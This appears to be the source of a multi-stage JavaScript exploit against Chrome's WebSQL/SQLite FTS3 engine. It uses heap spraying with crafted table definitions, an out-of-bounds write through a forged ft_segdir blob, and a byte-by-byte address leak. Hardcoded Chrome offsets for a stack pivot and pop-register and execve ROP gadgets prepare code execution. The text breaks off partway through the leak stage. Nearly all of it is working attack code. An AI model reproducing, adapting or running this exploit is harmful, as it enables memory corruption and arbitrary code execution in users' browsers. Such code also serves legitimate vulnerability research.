var database_name = "db_test___" + String(getRandomInt(0, 1000000000));
var db = openDatabase(database_name, 1, database_name, 5000000);
var global_table_index = 0;
var big_boy_spray_count = 8;
let oob_chunk_size = 0xa00;
let saved_index;
let reference_saved_index;
let reference_saved_index_offset;

let target_table_index;
let reference_table_index;
let corrupted_column;
let prefix_index_list = [];
let B_0x1000_offset;
let column_0x1000_offset;
let fts_table_offset;
let fts3_table_index;
let code_execution_table_index;

let fts3_azColumn_offset = 0x38;
//let fts3_zWriteExprlist_offset = 0x1b8;
let fts3_zWriteExprlist_offset = 0x18;      // This is in fact the Fts3Table->db field
let fts3_azColumn_leaked_value;
let fts3_zWriteExprlist_leaked_value;
let fts3_azColumn_leaked_byte_count;
let fts3_zWriteExprlist_leaked_byte_count;

let B_0x1000_offset_3bytes;
let B_0x1000_address;
let column_0x1000_address;
let fts_table_address;

let fts_table_bytes_0x48;
let chrome_base_hi;
let chrome_base_lo;
let chrome_main_heap_hi;
let chrome_main_heap_lo;
let leaked_chrome_address_offset = 0x82C2658;
let chrome_main_heap_offset = 0x83DB000;
let first_leak_offset = 0x14F01 * 8;
let second_leak_offset = 0x2ED * 8;
let ret_addr_offset = 0xa28 - 0x070 + 8;
let coop_addr_offset = 0x19C1B60;
let stack_pivot_gadget_offset = 0x623c5cc;
let pop_rdi_gadget_offset = 0x198caf3;
let pop_rsi_gadget_offset = 0x191c37e;
let pop_rdx_gadget_offset = 0x192e52f;
let execve_gadget_offset = 0x7DCB060;

let main_stack_hi;
let main_stack_lo;
let websql_stack_hi;
let websql_stack_lo;
let ret_addr_hi;
let ret_addr_lo;
let coop_addr_hi;
let coop_addr_lo;
let stack_pivot_gadget_addr_hi;
let stack_pivot_gadget_addr_lo;
let pop_rdi_gadget_addr_hi;
let pop_rdi_gadget_addr_lo;
let pop_rsi_gadget_addr_hi;
let pop_rsi_gadget_addr_lo;
let pop_rdx_gadget_addr_hi;
let pop_rdx_gadget_addr_lo;
let execve_gadget_addr_hi;
let execve_gadget_addr_lo;



function spray(statements, size, times, repeat_char){
    let size_adjusted;
    let column_name;

    if(size < 0x1000)
        size_adjusted = size - 0x10;
    else
        size_adjusted = size - 0x100;

    column_name = `${repeat_char.repeat(size_adjusted)}_0`;
    for(var i=1; i<times; i++){
        column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
    }
    statements.push(`CREATE TABLE test${global_table_index}(${column_name})`);
    global_table_index++;

    return global_table_index-1;
}

function spray_prefix(statements, size, times, repeat_char, prefix){
    let size_adjusted;
    let column_name;

    if(size < 0x1000)
        size_adjusted = size - 0x10;
    else
        size_adjusted = size - 0x100;

    column_name = `${prefix}_${repeat_char.repeat(size_adjusted)}_0`;
    for(var i=1; i<times; i++){
        column_name += `, ${prefix}_${repeat_char.repeat(size_adjusted)}_${i}`;
    }
    statements.push(`CREATE TABLE test${global_table_index}(${column_name})`);
    global_table_index++;

    return global_table_index-1;
}

function spray_custom_column(statements, size, times, repeat_char, column_index, column_size){
    let size_adjusted;
    let column_name;

    if(size < 0x1000)
        size_adjusted = size - 0x10;
    else
        size_adjusted = size - 0x100;

    if(column_index == 0)
        column_name = `${repeat_char.repeat(column_size - 0x100)}_0`;
    else
        column_name = `${repeat_char.repeat(size_adjusted)}_0`;
    for(var i=1; i<times; i++){
        if(column_index == i)
            column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
        else
            column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
    }
    statements.push(`CREATE TABLE test${global_table_index}(${column_name})`);
    global_table_index++;

    return global_table_index-1;
}

function spray_custom_column3(statements, size, times, repeat_char, column_index, column_size){
    let size_adjusted;
    let column_name;

    if(size < 0x1000)
        size_adjusted = size - 0x10;
    else
        size_adjusted = size - 0x100;

    if(column_index == 0)
        column_name = `${repeat_char.repeat(column_size - 0x100)}_0`;
    else
        column_name = `${repeat_char.repeat(size_adjusted)}_0`;
    for(var i=1; i<times; i++){
        if(column_index >= 0 && column_index < 40){
            //if((column_index+0 == i) || (column_index+1 == i) || (column_index+2 == i))
            if(((column_index + 0) == i) || ((column_index + 1) == i))
                column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
            else
                column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
        }
        else if(column_index >= 40 && column_index < 80){
            if((column_index+0 == i) || (column_index+1 == i) || (column_index-1 == i))
                column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
            else
                column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
        }
        else if(column_index == 80){
            if(((column_index + 0) == i) || ((column_index + 1) == i))
                column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
            else
                column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
        }
        else if(column_index >= 88 && column_index < 104){
            if(((column_index + 0) == i) || ((column_index + 1) == i))
                column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
            else
                column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
        }
        else{
            if(((column_index + 0) == i) || ((column_index + 1) == i))
                column_name += `, ${repeat_char.repeat(column_size - 0x100)}_${i}`;
            else
                column_name += `, ${repeat_char.repeat(size_adjusted)}_${i}`;
        }
    }
    statements.push(`CREATE TABLE test${global_table_index}(${column_name})`);
    global_table_index++;

    return global_table_index-1;
}


function dummy_table(statements){
    statements.push("CREATE TABLE test" + global_table_index + "(A)");
    global_table_index++;
}

function create_oob_string(chunk_size, memcpy_offset, payload){
    let target_chunk;
    let chunk_size_adjusted;

    if(chunk_size < 0x1000)
        chunk_size_adjusted = chunk_size - 0x10;
    else
        chunk_size_adjusted = chunk_size - 0x100;
    chunk_size_adjusted /= 2;   // To account for the *2 on realloc

    target_chunk = 'A'.hexEncode().repeat(chunk_size_adjusted);
    let payload_hex = payload.hexEncode();
    let oob_string = `X'00${create_var_int(chunk_size_adjusted)}${target_chunk}03010200${create_var_int(memcpy_offset)}${create_var_int(payload.length)}${payload_hex}03010200'`;

    return oob_string;
}

function create_var_int(number){
    let varint = '';
    let length = 0;
    let current_number = number;

    while(current_number != 0){
        let mask = 0x80;
        let shifted_number = current_number >> 7;

        if(shifted_number == 0){
            mask = 0;
        }
        let current_byte = (current_number & 0x7F) | mask;
        if((current_byte & 0xF0) == 0){
            varint += '0' + current_byte.toString(16);
        }
        else{
            varint += current_byte.toString(16);
        }
        current_number = shifted_number;
        length++;
    }

    return varint;
}

function ft3_spray(statements, size, payload){
    let size_adjusted;
    let column_name;

    size_adjusted = size - 0x280;

    column_name = `\x01\x02\xcc${"D".repeat(size_adjusted)}`;

    statements.push(`CREATE VIRTUAL TABLE test${global_table_index} USING fts3('${column_name}')`);
    global_table_index++;

    return global_table_index-1;
}

function sploit1() {
    console.log('Stage1 start!');

    var statements = [];

    statements.push("CREATE TABLE debug_table(AAA)");
    statements.push("CREATE VIRTUAL TABLE ft USING fts3");
    statements.push("INSERT INTO ft VALUES('dummy')");

    //statements.push("DROP TABLE debug_table");
    for(var i=0; i<big_boy_spray_count; i++){
        spray(statements, 0x10000000, 1, "A");
    }

    for(var i=0; i<0x100; i++){
        spray(statements, oob_chunk_size, 1, "A");
    }
    saved_index = global_table_index - 0x15;
    reference_saved_index = saved_index;

    runAll(statements, (event) => {
        console.log('Stage1 done');
        sploit2();
    });
}

function sploit2() {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");

    console.log('Stage2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${"A".repeat(0x10000000 - 0x100)}_0 FROM test${current_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == big_boy_spray_count-1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    sploit3_1(corrupted_index);
                }
                else{
                    console.log(`Stage1 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    runAll(statements, (event) => {
            ping_column(0);
            });
}

function sploit3_1(corrupted_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");
    let ping_start_index = global_table_index;

    console.log('Stage3-1 Start!');

    statements.push(`DROP TABLE test${corrupted_index}`);
    for(var i=0; i<0x50; i++){
        spray(statements, 0x1000000, 1, "A");
    }

    runAll(statements, (event) => {
            sploit3_2(ping_start_index)
            });
}

function sploit3_2(ping_start_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");

    console.log('Stage3-2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${"A".repeat(0x1000000 - 0x100)}_0 FROM test${current_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == ping_start_index + 0x50 - 1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    sploit4_1(corrupted_index);
                }
                else{
                    console.log(`Stage3 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    runAll(statements, (event) => {
        ping_column(ping_start_index + 40);
    });
}


function sploit4_1(corrupted_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");
    let ping_start_index = global_table_index;

    console.log('Stage4-1 Start!');

    statements.push(`DROP TABLE test${corrupted_index}`);
    for(var i=0; i<0x200; i++){
        spray(statements, 0x100000, 1, "A");
    }

    runAll(statements, (event) => {
            sploit4_2(ping_start_index);
            });
}

function sploit4_2(ping_start_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");

    console.log('Stage4-2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${"A".repeat(0x100000 - 0x100)}_0 FROM test${current_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == ping_start_index + 0x200 - 1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    console.log('Stage4 End!');
                    sploit5_1(corrupted_index);
                }
                else{
                    console.log(`Stage4 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    runAll(statements, (event) => {
            ping_column(ping_start_index);
            });
}


function sploit5_1(corrupted_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");
    let ping_start_index = global_table_index;

    console.log('Stage5-1 Start!');

    statements.push(`DROP TABLE test${corrupted_index}`);
    for(var i=0; i<0x600; i++){
        spray(statements, 0x10000, 1, "A");
    }

    runAll(statements, (event) => {
        sploit5_2(ping_start_index);
    });
}

function sploit5_2(ping_start_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");

    console.log('Stage5-2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${"A".repeat(0x10000 - 0x100)}_0 FROM test${current_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == ping_start_index + 0x400 - 1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    console.log('Stage5 End!');
                    sploit6_1(corrupted_index);
                }
                else{
                    console.log(`Stage5 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    runAll(statements, (event) => {
        ping_column(ping_start_index);
    });
}


function sploit6_1(corrupted_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");
    let ping_start_index = global_table_index;

    console.log('Stage6-1 Start!');

    statements.push(`DROP TABLE test${corrupted_index}`);
    for(var i=0; i<0x400; i++){
        spray(statements, 0x1000, 1, "A");
    }

    runAll(statements, (event) => {
        sploit6_2(ping_start_index);
    });
}

function sploit6_2(ping_start_index) {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "ZZZZ");

    console.log('Stage6-2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${"A".repeat(0x1000 - 0x100)}_0 FROM test${current_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == ping_start_index + 0x400 - 1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    console.log('Stage6 End!');
                    sploit7_1(corrupted_index);
                }
                else{
                    console.log(`Stage 6 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    runAll(statements, (event) => {
            ping_column(ping_start_index);
            });
}

function sploit7_1(corrupted_index) {
    let statements = [];
    let found_flag = 0;
    target_table_index = global_table_index;
    reference_table_index = corrupted_index;

    console.log('Stage7-1 Start!');

    statements.push(`DROP TABLE test${corrupted_index}`);
    spray(statements, 0x14, 104, "A");

    runAll(statements, (event) => {
        sploit7_2();
    });
}

function sploit7_2() {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "\x00\x02");

    console.log('Stage7-2 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    function ping_column(current_index){
        let statement = `SELECT ${'A'.repeat(0x4)}_${current_index} FROM test${target_table_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${current_index}`)
                        if(current_index == 104 - 1){
                            found_flag = -1;
                        }
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${current_index}`)
                        found_flag = 1;
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    ping_column(current_index + 1);
                }
                else if(found_flag == 1){
                    let corrupted_index = current_index;
                    console.log(`corrupted index : ${corrupted_index}`);
                    if(corrupted_index == 0){
                        console.log(`${corrupted_index} is not a good index. Scooting over a little bit and trying again...`);
                        console.log(`*WARNING* This may fail`);
                        reference_saved_index_offset++;
                        if(corrupted_index == 0){
                            saved_index = reference_saved_index + reference_saved_index_offset;
                        }
                        else{
                            saved_index = reference_saved_index - reference_saved_index_offset;
                        }
                        sploit7_2();
                        return;
                    }
                    console.log('Stage7-2 End!');
                    corrupted_column = corrupted_index;
                    sploit7_3();
                }
                else{
                    console.log(`Stage 7-2 : The column name didn't get corrupted.`);
                    console.log(`Trying to address this by scooting over a little bit and trying again...`);
                    console.log(`*WARNING* This may fail`);
                    reference_saved_index_offset++;
                    saved_index = reference_saved_index - reference_saved_index_offset;
                    sploit7_2();
                }
            }
        );
    }

    runAll(statements, (event) => {
            ping_column(0);
            });
}

function sploit7_3() {
    let statements = [];
    let found_flag = 0;
    let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, "\x00" + "\x00".repeat(8));

    console.log('Stage7-3 Start!');

    statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
    statements.push(`DROP TABLE test${saved_index}`);
    statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
    saved_index = spray(statements, oob_chunk_size, 1, "A");

    runAll(statements, (event) => {
        sploit8_1();
    });
}

function sploit8_1() {
    let statements = [];

    console.log('Stage8-1 Start!');

    if(corrupted_column != 80){
        statements.push(`DROP TABLE test${target_table_index}`);
        statements.push(`DROP TABLE test${reference_table_index+1}`);
    }
    else{
        let temp_index = global_table_index;
        ft3_spray(statements, 0xD80, "AAAA");
        statements.push(`DROP TABLE test${reference_table_index+1}`);
        statements.push(`DROP TABLE test${temp_index}`);
        statements.push(`DROP TABLE test${target_table_index}`);
    }

    target_table_index = global_table_index;
    spray_custom_column3(statements, 0x14, 104, "B", corrupted_column, 0x1000);
    statements.push(`DROP TABLE test${reference_table_index+2}`);
    code_execution_table_index = global_table_index;
    ft3_spray(statements, 0xD80, "AAAA");

    // Just for good measure. In case there are any holes left behind
    ft3_spray(statements, 0xD80, "AAAA");
    ft3_spray(statements, 0xD80, "AAAA");
    ft3_spray(statements, 0xD80, "AAAA");
    ft3_spray(statements, 0xD80, "AAAA");

    runAll(statements, (event) => {
        sploit8_2();
    });
}

function sploit8_2() {
    let found_flag = 0;
    let word = 0;
    let index = 0;

    console.log('Stage8-2 Start!');

    function partial_corrupt(){
        let statements = [];
        let payload = "\x00" + num_to_hex_bytes(word, 2);
        console.log('word : ' + word.toString(16));
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");
        word += 0x1000;

        runAll(statements, (event) => {
            ping_column();
        });
    }

    function ping_column(){
        let statement = `SELECT ${"B".repeat(0x1000 - 0x100)}_${corrupted_column} FROM test${target_table_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`test index : ${index}`)
                        found_flag = 1;
                    },
                    function(sqlTransaction, sqlError) {
                        console.log('fail!!!');
                        console.log(`test index : ${index}`)
                        if(index == 0x10 - 1){
                            found_flag = -1;
                        }
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    index++;
                    partial_corrupt();
                }
                else if(found_flag == 1){
                    console.log(`Column offset : ${(word-0x1000).toString(16)}`);
                    B_0x1000_offset = word-0x1000;

                    console.log('Stage8-2 End!');
                    sploit8_3();
                }
                else{
                    console.log(`Stage 8-2 : The column name didn't get corrupted. Something's wrong...?`);
                }
            }
        );
    }

    partial_corrupt();
}

function sploit8_3() {
    let found_flag = 0;
    let index = 0;
    let leaked_number;

    console.log('Stage8-3 Start!');

    function partial_corrupt(){
        let statements = [];
        let payload = "\x00" + num_to_hex_bytes(B_0x1000_offset + (index * 0x10000), 3);
        //console.log('leak index : ' + index);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");

        runAll(statements, (event) => {
            ping_column();
        });
    }

    function ping_column(){
        let statement = `SELECT ${"B".repeat(0x1000 - 0x100)}_${corrupted_column} FROM test${target_table_index}`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`byte : ${index.toString(16)}`)
                        found_flag = 1;
                    },
                    function(sqlTransaction, sqlError) {
                        //console.log('fail!!! : ' + sqlError.message);
                        //console.log(`test index : ${index}`)
                        if(index == 0x100 - 1){
                            found_flag = -1;
                        }
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    index++;
                    partial_corrupt();
                }
                else if(found_flag == 1){
                    console.log('Stage8-3 End!');

                    leaked_number = B_0x1000_offset + (index << 16);
                    console.log('Leaked Byte : 0x' + index.toString(16));
                    console.log('Leaked Number : 0x' + leaked_number.toString(16));
                    B_0x1000_offset_3bytes = leaked_number;
                    column_0x1000_offset = B_0x1000_offset_3bytes - 0x1000;
                    fts_table_offset = B_0x1000_offset_3bytes + 0x1000;
                    sploit9_1();
                }
                else{
                    console.log(`Stage 8-3 : 3rd byte leak fail :(`);
                }
            }
        );
    }

    partial_corrupt();
}

function sploit9_1() {
    let current_leak_offset = 5;
    let found_flag;
    let index;
    let leaked_string = '';
    let leaked_number = 0;
    let leaked_byte_count = 0;

    console.log('Stage9-1 Start!');

    function partial_corrupt(){
        let statements = [];
        found_flag = 0;
        index = 1;
        let payload = "\x00" + num_to_hex_bytes(fts_table_offset + fts3_zWriteExprlist_offset + current_leak_offset, 3);
        console.log('leak index : ' + current_leak_offset);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");
        current_leak_offset -= 1;

        runAll(statements, (event) => {
            ping_column();
        });
    }

    function ping_column(){
        let brute_string = String.fromCharCode(index) + leaked_string;
        let statement = `INSERT INTO test${target_table_index}("${brute_string}") VALUES ('')`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`byte : ${index.toString(16)}`)
                        found_flag = 1;
                        leaked_byte_count++;
                    },
                    function(sqlTransaction, sqlError) {
                        //console.log('fail!!! : ' + sqlError.message);
                        //console.log(`test index : ${index}`)
                        if(index == 0x100 - 1){
                            found_flag = -1;
                        }
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    index++;
                    ping_column();
                }
                else if(found_flag == 1){
                    console.log('Leaked Bytes : 0x' + index.toString(16));
                    leaked_string = String.fromCharCode(index) + leaked_string;
                    leaked_number = (leaked_number * 0x100) + index;
                    if(current_leak_offset == 1){
                        console.log('Stage9-1 End!');
                        console.log('Leaked Address : 0x' + leaked_number.toString(16));
                        console.log(`If it reaches here, it's a frickin' miracle`);
                        fts3_zWriteExprlist_leaked_value = leaked_number;
                        fts3_zWriteExprlist_leaked_byte_count = leaked_byte_count;
                        sploit9_2();
                    }
                    else{
                        partial_corrupt();
                    }
                }
                else{
                    console.log(`Stage 9-1 : Partial Infoleak Success!`);
                    console.log('leaked bytes length : ' + leaked_byte_count);
                    console.log('leaked number : ' + leaked_number.toString(16));
                    fts3_zWriteExprlist_leaked_value = leaked_number;
                    fts3_zWriteExprlist_leaked_byte_count = leaked_byte_count;
                    sploit9_2();
                }
            }
        );
    }

    partial_corrupt();
}

function sploit9_2() {
    let current_leak_offset = 5;
    let found_flag;
    let index;
    let leaked_string = '';
    let leaked_number = 0;
    let leaked_byte_count = 0;

    console.log('Stage9-2 Start!');

    function partial_corrupt(){
        let statements = [];
        found_flag = 0;
        index = 1;
        let payload = "\x00" + num_to_hex_bytes(fts_table_offset + fts3_azColumn_offset + current_leak_offset, 3);
        console.log('leak index : ' + current_leak_offset);
        let oob_string = create_oob_string(oob_chunk_size, 0x7FFFFFFF, payload);

        statements.push(`UPDATE ft_segdir SET root = ${oob_string}`);
        statements.push(`DROP TABLE test${saved_index}`);
        statements.push(`SELECT * FROM ft WHERE ft MATCH 'test'`);
        saved_index = spray(statements, oob_chunk_size, 1, "A");
        current_leak_offset -= 1;

        runAll(statements, (event) => {
            ping_column();
        });
    }

    function ping_column(){
        let brute_string = String.fromCharCode(index) + leaked_string;
        let statement = `INSERT INTO test${target_table_index}("${brute_string}") VALUES ('')`;
        db.transaction((tx) => {
                tx.executeSql(
                    statement, [],
                    function(sqlTransaction, sqlResultSet) {
                        console.log('success!!!');
                        console.log(`byte : ${index.toString(16)}`)
                        found_flag = 1;
                        leaked_byte_count++;
                    },
                    function(sqlTransaction, sqlError) {
                        //console.log('fail!!! : ' + sqlError.message);
                        //console.log(`test index : ${index}`)
                        if(index == 0x100 - 1){
                            found_flag = -1;
                        }
                    }
                );
            },
            dbErr,
            function(){
                if(found_flag == 0){
                    index++;
                    ping_column();
                }
                else if(found_flag == 1){
                    console.log('Leaked Bytes : 0x' + index.toString(16));
                    leaked_string = String.fromCharCode(index) + leaked_string;
                    leaked_number = (leaked_number * 0x100) + index;
                    //if(current_leak_offset == -1){
                    if(current_leak_offset == 1){
                        console.log('Stage9-2 End!');
                        console.log('Leaked Address : 0x' + leaked_number.toString(16));
                        console.log(`If it reaches here, it's a frickin' miracle`);
                        fts3_azColumn_leaked_value = leaked_number;
                        fts3_azColumn_leaked_byte_count = leaked_byte_count;
                        sploit9_3();
                    }
                    else{
                        partial_corrupt();
                    }
                }
                else{
                    console.log(`Stage 9-2 : Partial Infoleak Success!`);
                    console.log('leaked bytes length : ' + leaked_byte_count);
                    console.log('leaked number : ' + leaked_number.toString(16));
                    fts3_azColumn_leaked_value = leaked_number;
                    fts3_azColumn_leaked_byte_count = leaked_byte_count;
                    sploit9_3();
                }
            }
        );
    }

    partial_corrupt();
}

function sploit9_3() {
    let found_flag = 0;
    let index = 0;
    let leaked_number;
    let fts3_azColumn_leaked_value_second_byte;
    let fts3_zWriteExprlist_leaked_value_second_byte;
    let leak_base_address;
    let leak_probe_address;

    console.log('Stage9-3 Start!');

    if((fts3_azColumn_leaked_byte_count == 0) || (fts3_zWriteExprlist_leaked_byte_count == 0)){
        console.log(`The FTS table is allocated somewhere else and wasn't leaked. Run the exploit again in a new page...`);
        return;
    }

    if((fts3_azColumn_leaked_byte_count < 2) || (fts3_zWriteExprlist_leaked_byte_count < 2)){
        console.log('Aww man. The second MSB of the address was not leaked. Better luck next time... :(');
        console.log('To re-test, close Chrome entirely and reopen it and run the script again, so as to start with a better address layout');
        return;
    }

    // Dirty way to handle large integers...
    fts3_azColumn_leaked_value_second_byte = ((fts3_azColumn_leaked_value / Math.pow(0x100, fts3_azColumn_leaked_byte_count - 2)) >>> 0) & 0xFF;
    fts3_zWriteExprlist_leaked_value_second_byte = ((fts3_zWriteExprlist_leaked_value / Math.pow(0x100, fts3_zWriteExprlist_leaked_byte_count - 2)) >>> 0) & 0xFF;

    if( ((fts3_azColumn_leaked_value_second_byte >= 0x41) && (fts3_azColumn_leaked_value_second_byte <= 0x5A)) ||
        ((fts3_azColumn_leaked_value_second_byte >= 0x61) && (fts3_azColumn_leaked_value_second_byte <= 0x7A)) ||
        ((fts3_zWriteExprlist_leaked_value_second_byte >= 0x41) && (fts3_zWriteExprlist_leaked_value_second_byte <= 0x5A)) ||
        ((fts3_zWriteExprlist_leaked_value_second_byte >= 0x61) && (fts3_zWriteExprlist_leaked_value_second_byte <= 0x7A)) ){
        console.log(`Uh oh. Due to column name case insensitivity, the second MSB leaked byte might be inaccurate. Let's gamble here...`);
    }

    if(fts3_azColumn_leaked_byte_count >= 3){
        console.log(`Truncate it on purpose. We're still gonna brute the 4th byte because we don't know whether the leaked 4th byte is case insensitive and hence, inaccurate`);

        fts3_azColumn_leaked_value = (fts3_azColumn_leaked_value / Math.pow(0x100, fts3_azColumn_leaked_byte_count - 3)) >>> 0;
        fts3_azColumn_leaked_byte_count = 3;

        console.log(`Case 0`);
        leak_base_address = fts3_azColumn_leaked_value * 0x1000000;
